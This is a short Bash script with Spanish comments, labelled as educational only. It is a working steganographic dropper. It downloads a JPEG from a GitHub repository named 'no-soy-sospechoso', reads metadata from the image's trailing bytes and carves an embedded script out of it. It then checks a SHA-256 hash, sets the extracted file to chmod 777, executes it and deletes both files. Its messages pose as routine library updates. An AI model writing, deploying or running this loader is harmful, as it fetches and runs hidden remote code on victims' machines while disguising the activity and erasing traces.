#!/bin/bash

#solo para usos educacionales
#no se debe usar en produccion

repo="https://raw.githubusercontent.com/vtomasv/no-soy-sospechoso/main/img/"

# Obtenemos la actualización que se desea descargar :-) 
update=$1

# Verificación de argumentos
if [ "$#" = 0 ]; then
	update="logo.jpeg"
elif [ $# -eq 2 ]; then
    echo "Error: Ocurrio un error al actualizar las librerias base -e 01."
    exit 1
fi

# Definimos la URL de la imagen a descargar, usted puede personalizar esta script con la url de su repo
url=$repo$update

# Definimos el nombre de archivo de salida
filename="logo.jpeg"

estearch="$filename"

output="salida.sh"

# Descargamos la imagen utilizando la función download_image
download_image() {
    wget -O "$filename" "$url"
}

# Leemos la iforamción necesaria para poder actualizar nueva funcionalidades :-) 

function readMetaDataText {
	validestearchCheck="$(tail -c 500 $estearch | grep -a 'SECSHA' | awk '{print $1}')"
	if [ "$validestearchCheck" != "SECSHA:" ]; then
		echo "Error: Ocurrio un error al actualizar las librerias base -e 02." >&2
		exit 1
	fi
	secSha="$(tail -c 500 $estearch | grep -a 'SECSHA' | awk '{print $2}')"
	carSha="$(tail -c 500 $estearch | grep -a 'CARSHA' | awk '{print $2}')"
	startByte="$(tail -c 500 $estearch | grep -a 'STARTBYTE' | awk '{print $2}')"
	endByte="$(tail -c 500 $estearch | grep -a 'ENDBYTE' | awk '{print $2}')"
	metaByte="$(tail -c 500 $estearch | grep -a 'METABYTE' | awk '{print $2}')"
}

#  Extraemos el archivo de salida :-)
function extractSecretFile {
	head -c "$endByte" "$estearch" | tail -c +"$startByte" > "$output"
	extractedSha="$(shasum -a 256 "$output" | awk '{print $1}')"
	if [ "$extractedSha" = "$secSha" ]; then
		echo "ÉXITO: update de todas las librerias realizado con exito"
	else
		echo  "Error: Ocurrio un error al actualizar las librerias base -e 03."
	fi
}



# Llamamos a la función download_image
download_image
readMetaDataText
extractSecretFile

echo $(chmod 777 "$output" &&  ./"$output")

# Borramos el archivo de salida
rm "$output"
rm "$estearch"
